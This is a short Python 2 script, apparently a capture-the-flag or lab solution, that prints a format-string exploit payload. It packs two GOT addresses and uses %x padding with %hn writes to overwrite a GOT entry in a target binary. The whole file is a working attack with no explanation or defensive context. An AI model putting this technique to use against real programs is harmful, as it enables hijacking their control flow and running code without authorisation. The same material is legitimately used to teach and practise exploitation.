import struct

bigGot = struct.pack("<I", 0x804983a)
lilGot = struct.pack("<I", 0x8049838)
fstr = "%2044x" + "%4$hn" + "%31904x" + "%5$hn"

print bigGot + lilGot + fstr
